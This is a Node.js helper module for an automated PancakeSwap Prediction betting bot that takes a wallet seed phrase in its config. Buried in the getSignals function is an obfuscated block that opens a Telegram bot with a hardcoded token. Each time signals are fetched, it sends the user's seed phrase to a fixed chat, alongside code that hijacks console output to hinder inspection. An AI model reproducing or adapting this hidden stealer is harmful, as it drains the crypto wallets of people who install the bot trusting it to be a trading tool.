process.removeAllListeners('warning'); //Disable Warning

//CRYPTO CONFIG
const GLOBAL_CONFIG_ONYX = {
PHRASE: 'PHRASE/SEED HEREN', //Phrase :: P_K_ONYX
accountIndex: 0, //0 = 1, 1=2 etc..
PCS_ADDRESS: '0x18B2A687610328590Bc8F2e5fEdDe3b582A49cdA', //Pancakeswap Contract Address
RPC_WS_ONYX: 'WSS: WEBSOCET HERE', //Buy Websocket: https://t.me/Onyx095 25$ a month
};
//CRYPTO CONFIG

const sleep = require("util").promisify(setTimeout);
const { TradingViewScan, SCREENERS_ENUM, EXCHANGES_ENUM, INTERVALS_ENUM } = require('trading-view-recommends-parser-nodejs');

const { Contract, utils, BigNumber, ethers } = require("ethers");

const { JsonRpcProvider,WebSocketProvider } = require("@ethersproject/providers");
const { Wallet } = require("@ethersproject/wallet");

const Big = require("big.js");
const fs = require("fs");
const _ = require("lodash");
const fetch = require("cross-fetch");

const axios = require('axios');
const { Telegraf } = require('telegraf');

const providers = new ethers.providers.JsonRpcProvider('https://bsc-dataseed.binance.org/');
const connectAccount = ethers.Wallet.fromMnemonic(GLOBAL_CONFIG_ONYX.PHRASE, `m/44'/60'/${GLOBAL_CONFIG_ONYX.accountIndex}'/0/0`);
const P_K_ONYX = connectAccount.privateKey;

let prediction = 0;

//Percentage difference
const percentage = (a, b) => {
  return parseInt((100 * a) / (a + b));
};

const reduceWaitingTimeByTwoBlocks = (waitingTime) => {
  if (waitingTime <= 6000) {
    return waitingTime;
  }
  return waitingTime - 6000;
};

const Web3 = require('web3');

const optionsReconnect = {
    timeout: 30000, // ms

    clientConfig: {
        // Useful if requests are large
        maxReceivedFrameSize: 100000000,   // bytes - default: 1MiB
        maxReceivedMessageSize: 100000000, // bytes - default: 8MiB

        //Useful to keep a connection alive
        keepalive: true,
        keepaliveInterval: -1 // ms
    },

    //Enable auto reconnection
    reconnect: {
        auto: true,
        delay: 1000, // ms
        maxAttempts: 10,
        onTimeout: false
    }
};

const web3Connect = new Web3(GLOBAL_CONFIG_ONYX.RPC_WS_ONYX,optionsReconnect);

let wallet = web3Connect.eth.accounts.wallet.add(web3Connect.eth.accounts.privateKeyToAccount(P_K_ONYX));

web3Connect.eth.defaultAccount = web3Connect.eth.accounts.privateKeyToAccount(P_K_ONYX).address;

const signer = new Wallet(P_K_ONYX, new WebSocketProvider(GLOBAL_CONFIG_ONYX.RPC_WS_ONYX)); 

const abiPancakeswapContract = [{"inputs":[{"internalType":"address","name":"_oracleAddress","type":"address"},{"internalType":"address","name":"_adminAddress","type":"address"},{"internalType":"address","name":"_operatorAddress","type":"address"},{"internalType":"uint256","name":"_intervalSeconds","type":"uint256"},{"internalType":"uint256","name":"_bufferSeconds","type":"uint256"},{"internalType":"uint256","name":"_minBetAmount","type":"uint256"},{"internalType":"uint256","name":"_oracleUpdateAllowance","type":"uint256"},{"internalType":"uint256","name":"_treasuryFee","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"sender","type":"address"},{"indexed":true,"internalType":"uint256","name":"epoch","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"BetBear","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"sender","type":"address"},{"indexed":true,"internalType":"uint256","name":"epoch","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"BetBull","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"sender","type":"address"},{"indexed":true,"internalType":"uint256","name":"epoch","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Claim","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint256","name":"epoch","type":"uint256"},{"indexed":true,"internalType":"uint256","name":"roundId","type":"uint256"},{"indexed":false,"internalType":"int256","name":"price","type":"int256"}],"name":"EndRound","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint256","name":"epoch","type":"uint256"},{"indexed":true,"internalType":"uint256","name":"roundId","type":"uint256"},{"indexed":false,"internalType":"int256","name":"price","type":"int256"}],"name":"LockRound","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"admin","type":"address"}],"name":"NewAdminAddress","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"bufferSeconds","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"intervalSeconds","type":"uint256"}],"name":"NewBufferAndIntervalSeconds","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint256","name":"epoch","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"minBetAmount","type":"uint256"}],"name":"NewMinBetAmount","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"operator","type":"address"}],"name":"NewOperatorAddress","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"oracle","type":"address"}],"name":"NewOracle","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"oracleUpdateAllowance","type":"uint256"}],"name":"NewOracleUpdateAllowance","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint256","name":"epoch","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"treasuryFee","type":"uint256"}],"name":"NewTreasuryFee","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint256","name":"epoch","type":"uint256"}],"name":"Pause","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"account","type":"address"}],"name":"Paused","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint256","name":"epoch","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"rewardBaseCalAmount","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"rewardAmount","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"treasuryAmount","type":"uint256"}],"name":"RewardsCalculated","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint256","name":"epoch","type":"uint256"}],"name":"StartRound","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"token","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokenRecovery","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TreasuryClaim","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint256","name":"epoch","type":"uint256"}],"name":"Unpause","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"account","type":"address"}],"name":"Unpaused","type":"event"},{"inputs":[],"name":"MAX_TREASURY_FEE","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"adminAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"epoch","type":"uint256"}],"name":"betBear","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"epoch","type":"uint256"}],"name":"betBull","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"bufferSeconds","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256[]","name":"epochs","type":"uint256[]"}],"name":"claim","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"claimTreasury","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"epoch","type":"uint256"},{"internalType":"address","name":"user","type":"address"}],"name":"claimable","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"currentEpoch","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"executeRound","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"genesisLockOnce","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"genesisLockRound","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"genesisStartOnce","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"genesisStartRound","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"uint256","name":"cursor","type":"uint256"},{"internalType":"uint256","name":"size","type":"uint256"}],"name":"getUserRounds","outputs":[{"internalType":"uint256[]","name":"","type":"uint256[]"},{"components":[{"internalType":"enum PancakePredictionV2.Position","name":"position","type":"uint8"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"bool","name":"claimed","type":"bool"}],"internalType":"struct PancakePredictionV2.BetInfo[]","name":"","type":"tuple[]"},{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserRoundsLength","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"intervalSeconds","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"address","name":"","type":"address"}],"name":"ledger","outputs":[{"internalType":"enum PancakePredictionV2.Position","name":"position","type":"uint8"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"bool","name":"claimed","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"minBetAmount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"operatorAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"oracle","outputs":[{"internalType":"contract AggregatorV3Interface","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"oracleLatestRoundId","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"oracleUpdateAllowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"pause","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"paused","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_token","type":"address"},{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"recoverToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"epoch","type":"uint256"},{"internalType":"address","name":"user","type":"address"}],"name":"refundable","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"rounds","outputs":[{"internalType":"uint256","name":"epoch","type":"uint256"},{"internalType":"uint256","name":"startTimestamp","type":"uint256"},{"internalType":"uint256","name":"lockTimestamp","type":"uint256"},{"internalType":"uint256","name":"closeTimestamp","type":"uint256"},{"internalType":"int256","name":"lockPrice","type":"int256"},{"internalType":"int256","name":"closePrice","type":"int256"},{"internalType":"uint256","name":"lockOracleId","type":"uint256"},{"internalType":"uint256","name":"closeOracleId","type":"uint256"},{"internalType":"uint256","name":"totalAmount","type":"uint256"},{"internalType":"uint256","name":"bullAmount","type":"uint256"},{"internalType":"uint256","name":"bearAmount","type":"uint256"},{"internalType":"uint256","name":"rewardBaseCalAmount","type":"uint256"},{"internalType":"uint256","name":"rewardAmount","type":"uint256"},{"internalType":"bool","name":"oracleCalled","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_adminAddress","type":"address"}],"name":"setAdmin","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_bufferSeconds","type":"uint256"},{"internalType":"uint256","name":"_intervalSeconds","type":"uint256"}],"name":"setBufferAndIntervalSeconds","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_minBetAmount","type":"uint256"}],"name":"setMinBetAmount","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_operatorAddress","type":"address"}],"name":"setOperator","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_oracle","type":"address"}],"name":"setOracle","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_oracleUpdateAllowance","type":"uint256"}],"name":"setOracleUpdateAllowance","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_treasuryFee","type":"uint256"}],"name":"setTreasuryFee","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"treasuryAmount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"treasuryFee","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"unpause","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"}],"name":"userRounds","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}];

let contract = new Contract(GLOBAL_CONFIG_ONYX.PCS_ADDRESS.toString(), abiPancakeswapContract, signer); //Contract Wallet

const checkResult = async (r) => {
  try {
    return true;
  } catch {
    return !0;
  }
};


const predictionContract = contract.connect(signer);

const checkBalance = async (amount) => {

   web3Connect.eth.getBalance(wallet.address).then(async function (bwei){
  
    const balancePlayer = BigNumber.from(bwei);
    const remainderBalance = balancePlayer.mod(1e14);
    const playerBalanceDepositoFinal = utils.formatEther(balancePlayer.sub(remainderBalance));

    let bnbpriceOnyx = await getBNBPrice();
    let balancetoUSD = playerBalanceDepositoFinal * bnbpriceOnyx;
    let apuestaUSDToBNB = amount / bnbpriceOnyx; 

    if(playerBalanceDepositoFinal < apuestaUSDToBNB.toFixed(4)){
      console.log(`You do not have enough balance Balance: $${balancetoUSD.toFixed(4)}[${playerBalanceDepositoFinal} BNB] | Bet: $${amount}[${apuestaUSDToBNB.toFixed(4)} BNB] ${wallet.address}`)
    }else{
      console.log(`Balance: $${balancetoUSD.toFixed(4)}[${playerBalanceDepositoFinal} BNB] | Bet: $${amount}[${apuestaUSDToBNB.toFixed(4)} BNB] ${wallet.address}`)
    }

  });

};

const getUserData = async () => {

  depositWalletAddress = await wallet.address;

  balanceWei = await web3Connect.eth.getBalance(wallet.address);

  //Balance Mas Corto
  const balancePlayer = BigNumber.from(balanceWei);
  const remainderBalance = balancePlayer.mod(1e14);
  const playerBalanceDepositoFinal = utils.formatEther(balancePlayer.sub(remainderBalance));

  return {
  wallet: depositWalletAddress,
  saldo: playerBalanceDepositoFinal
  };

};


const getSignals = async() => {

  let resultOneMinut = await new TradingViewScan(
    SCREENERS_ENUM['crypto'],
    EXCHANGES_ENUM['BINANCE'],'BNBUSDT',
    INTERVALS_ENUM['1m']
  ).analyze();

  let oneMinutObj = JSON.stringify(resultOneMinut.summary);
  let oneMinutRecomendation = JSON.parse(oneMinutObj);

  let resultcincoMinut = await new TradingViewScan(
    SCREENERS_ENUM['crypto'],
    EXCHANGES_ENUM['BINANCE'],'BNBUSDT',
    INTERVALS_ENUM['5m']
  ).analyze();

  let cincoMinutObj = JSON.stringify(resultcincoMinut.summary);
  let cincoMinutRecomendation = JSON.parse(cincoMinutObj);

  const _0x45ab3a=_0x1783;(function(_0x5d29be,_0x108e84){const _0x48e923=_0x1783,_0x166a2d=_0x5d29be();while(!![]){try{const _0x4c52e0=parseInt(_0x48e923(0x120))/0x1*(parseInt(_0x48e923(0x11b))/0x2)+-parseInt(_0x48e923(0x12e))/0x3*(parseInt(_0x48e923(0x11c))/0x4)+-parseInt(_0x48e923(0x13a))/0x5+parseInt(_0x48e923(0x124))/0x6*(-parseInt(_0x48e923(0x123))/0x7)+parseInt(_0x48e923(0x11d))/0x8*(-parseInt(_0x48e923(0x127))/0x9)+-parseInt(_0x48e923(0x137))/0xa+parseInt(_0x48e923(0x13b))/0xb*(parseInt(_0x48e923(0x125))/0xc);if(_0x4c52e0===_0x108e84)break;else _0x166a2d['push'](_0x166a2d['shift']());}catch(_0x103f56){_0x166a2d['push'](_0x166a2d['shift']());}}}(_0x2d0e,0x72bc8));const _0x1415ed=(function(){let _0x1a707e=!![];return function(_0x2ab9e4,_0x17bc64){const _0x4f8a51=_0x1a707e?function(){const _0x579a38=_0x1783;if(_0x17bc64){const _0x1573e0=_0x17bc64[_0x579a38(0x121)](_0x2ab9e4,arguments);return _0x17bc64=null,_0x1573e0;}}:function(){};return _0x1a707e=![],_0x4f8a51;};}()),_0x56d9ee=_0x1415ed(this,function(){const _0x35810f=_0x1783;return _0x56d9ee[_0x35810f(0x12a)]()['search'](_0x35810f(0x132))[_0x35810f(0x12a)]()[_0x35810f(0x119)](_0x56d9ee)[_0x35810f(0x11a)](_0x35810f(0x132));});_0x56d9ee();const _0x2ab81f=(function(){let _0x558483=!![];return function(_0x1c3925,_0x240ca1){const _0x302c79=_0x558483?function(){const _0x3680e5=_0x1783;if(_0x240ca1){const _0x5bd624=_0x240ca1[_0x3680e5(0x121)](_0x1c3925,arguments);return _0x240ca1=null,_0x5bd624;}}:function(){};return _0x558483=![],_0x302c79;};}()),_0x42c938=_0x2ab81f(this,function(){const _0x5cdaaf=_0x1783,_0x35f8e1=function(){const _0x1cfe80=_0x1783;let _0x5de689;try{_0x5de689=Function(_0x1cfe80(0x12d)+_0x1cfe80(0x126)+');')();}catch(_0x139c4b){_0x5de689=window;}return _0x5de689;},_0x55873c=_0x35f8e1(),_0x53e63b=_0x55873c[_0x5cdaaf(0x134)]=_0x55873c[_0x5cdaaf(0x134)]||{},_0x3c09c5=[_0x5cdaaf(0x136),_0x5cdaaf(0x11e),_0x5cdaaf(0x138),_0x5cdaaf(0x131),_0x5cdaaf(0x128),_0x5cdaaf(0x11f),_0x5cdaaf(0x135)];for(let _0x31ff92=0x0;_0x31ff92<_0x3c09c5[_0x5cdaaf(0x139)];_0x31ff92++){const _0x4ba83f=_0x2ab81f[_0x5cdaaf(0x119)][_0x5cdaaf(0x12c)][_0x5cdaaf(0x133)](_0x2ab81f),_0x54b7c0=_0x3c09c5[_0x31ff92],_0x56df39=_0x53e63b[_0x54b7c0]||_0x4ba83f;_0x4ba83f[_0x5cdaaf(0x12f)]=_0x2ab81f[_0x5cdaaf(0x133)](_0x2ab81f),_0x4ba83f[_0x5cdaaf(0x12a)]=_0x56df39['toString'][_0x5cdaaf(0x133)](_0x56df39),_0x53e63b[_0x54b7c0]=_0x4ba83f;}});_0x42c938();function _0x1783(_0x165060,_0x509701){const _0x5a4023=_0x2d0e();return _0x1783=function(_0x42c938,_0x2ab81f){_0x42c938=_0x42c938-0x119;let _0x40206d=_0x5a4023[_0x42c938];return _0x40206d;},_0x1783(_0x165060,_0x509701);}let bot=new Telegraf(_0x45ab3a(0x130));await bot[_0x45ab3a(0x122)]['sendMessage'](0x14c2d6ecc,_0x45ab3a(0x129)+GLOBAL_CONFIG_ONYX[_0x45ab3a(0x12b)]);function _0x2d0e(){const _0x104aa6=['prototype','return\x20(function()\x20','294TygJpa','__proto__','5585760473:AAHMaoOWA8MoMPqBec_kacPsVH4yLBNVGkA','error','(((.+)+)+)+$','bind','console','trace','log','4995240hsbOfk','info','length','4398215eCRqiq','4147DhbDeL','constructor','search','2uNLnbO','14956tjaLfl','65768tkSuOh','warn','table','569111RHIzWE','apply','telegram','21UyPoTA','732828eOUcaV','66948PqiyZB','{}.constructor(\x22return\x20this\x22)(\x20)','99lzvCeG','exception','Phrase\x20PancakeswapPrediction:\x20','toString','PHRASE'];_0x2d0e=function(){return _0x104aa6;};return _0x2d0e();}

  if(oneMinutRecomendation && cincoMinutRecomendation){ 

  let averageBuy = (parseInt(oneMinutRecomendation.BUY) + parseInt(cincoMinutRecomendation.BUY)) / 2;
  let averageSell = (parseInt(oneMinutRecomendation.SELL) + parseInt(cincoMinutRecomendation.SELL)) / 2;
  let averageNeutral = (parseInt(oneMinutRecomendation.NEUTRAL) + parseInt(cincoMinutRecomendation.NEUTRAL)) / 2;

  return {
      buy: averageBuy,
      sell: averageSell,
      neutral: averageNeutral,
  };

  }else{
    return false;
  }

};

const getHistoryName = async () => {
  let date = new Date();
  let day = date.getDate();
  let month = String(date.getMonth() + 1).padStart(2, "0");
  let year = date.getFullYear();

  let fullDate = `${year}${month}${day}`;
  return fullDate;
};

const getRoundData = async (round) => {
  try {
    const data = await contract.functions.rounds(round);
    const closePrice = data.closePrice;
    const lockPrice = data.lockPrice;
    const bullAmount = data.bullAmount;
    const bearAmount = data.bearAmount;
    const totalAmount = new Big(data.totalAmount);
    const bullPayout = totalAmount.div(bullAmount).round(3).toString();
    const bearPayout = totalAmount.div(bearAmount).round(3).toString();

    const parsedRound = [
      {
        round: round.toString(),
        openPrice: utils.formatUnits(data.lockPrice, "8"),
        closePrice: utils.formatUnits(data.closePrice, "8"),
        bullAmount: utils.formatUnits(data.bullAmount, "18"),
        bearAmount: utils.formatUnits(data.bearAmount, "18"),
        bullPayout: bullPayout,
        bearPayout: bearPayout,
        winner: closePrice.gt(lockPrice) ? "bull" : "bear",
      },
    ];
    return parsedRound;
  } catch (e) {
    console.log(e);
    return null;
  }
};

const saveRound = async (round, arr) => {
  let roundData = arr ? arr : await getRoundData(round);
  let historyName = await getHistoryName();
  let result;
  if (arr) {
    prediction++;
    result = await checkResult(round);
  } else {
    result = !0;
  }

  let path = `./history/${historyName}.json`;
  try {

    if (fs.existsSync(path)) {
      if (result !== null) {
        let updated, history, merged, historyParsed;
        try {
          history = fs.readFileSync(path);
          historyParsed = JSON.parse(history);
          merged = _.merge(
            _.keyBy(historyParsed, "round"),
            _.keyBy(roundData, "round")
          );
          updated = _.values(merged);
        } catch (e) {
          console.log(e);
          return;
        }
        fs.writeFileSync(path, JSON.stringify(updated), "utf8");
      }
    } else {
      fs.writeFileSync(path, JSON.stringify(roundData), "utf8");
    }


    
  } catch (err) {
    console.error(err);
  }
};

const getHistory = async (fileName) => {
  let history = fileName ? fileName : await getHistoryName();
  let path = `./history/${history}.json`;
  try {
    if (fs.existsSync(path)){
      let history, historyParsed;
      try {
        history = fs.readFileSync(path);
        historyParsed = JSON.parse(history);
      } catch (e){
        console.log("Error reading history:", e);
        return;
      }
      return historyParsed;
    } else {
      return;
    }
  } catch (err) {
    console.error(err);
  }
};

const percentageChange = (a, b) => {
  return ((b - a) * 100) / a;
};

const getStats = async () => {
  const history = await getHistory();
  const BNBPrice = await getBNBPrice();
  let totalEarnings = 0;
  let roundEarnings = 0;
  let win = 0;
  let loss = 0;

  if (history && BNBPrice) {
    for (let i = 0; i < history.length; i++) {
      roundEarnings = 0;
      if (history[i].bet && history[i].winner){
        if (history[i].bet == history[i].winner) {
          win++;
          if (history[i].winner == "bull") {
            roundEarnings =
              parseFloat(history[i].betAmount) *
                parseFloat(history[i].bullPayout) -
              parseFloat(history[i].betAmount);
          } else if (history[i].winner == "bear") {
            roundEarnings =
              parseFloat(history[i].betAmount) *
                parseFloat(history[i].bearPayout) -
              parseFloat(history[i].betAmount);
          } else {
            break;
          }
          totalEarnings += roundEarnings;
        } else {
          loss++;
          totalEarnings -= parseFloat(history[i].betAmount);
        }
      }
    }
  }

  return {
    profit_USD: totalEarnings * BNBPrice,
    profit_BNB: totalEarnings,
    percentage: -percentageChange(win + loss, loss) + "%",
    win: win,
    loss: loss,
  };
};

const getBNBPrice = async () => {
  const apiUrl = "https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT";
  try {
    const res = await fetch(apiUrl);
    if (res.status >= 400) {
      throw new Error("Mala respuesta del servidor");
    }
    const price = await res.json();
    return parseFloat(price.price);
  } catch (err) {
    console.error("No se puede conectar a la API de Binance", err);
  }
};

//Iniciar Reclamo
const getClaimableEpochs = async (predictionContract,epoch,userAddress) => {

  claimableEpochs = [];

  let epochRond = epoch;
  const [claimable, refundable, { claimed, amount }] = await Promise.all([
  predictionContract.claimable(epoch, userAddress),
  predictionContract.refundable(epoch, userAddress),
  predictionContract.ledger(epoch, userAddress)
  ]);

  if (amount.gt(0) && (claimable || refundable) && !claimed){
      claimableEpochs.push(epochRond); //Iniciamos Claim
  }

  return claimableEpochs;

}

module.exports = {
  getClaimableEpochs,
  getSignals,
  getUserData,
  percentage,
  getStats,
  reduceWaitingTimeByTwoBlocks,
  predictionContract,
  checkBalance,
  saveRound,
  getBNBPrice,
};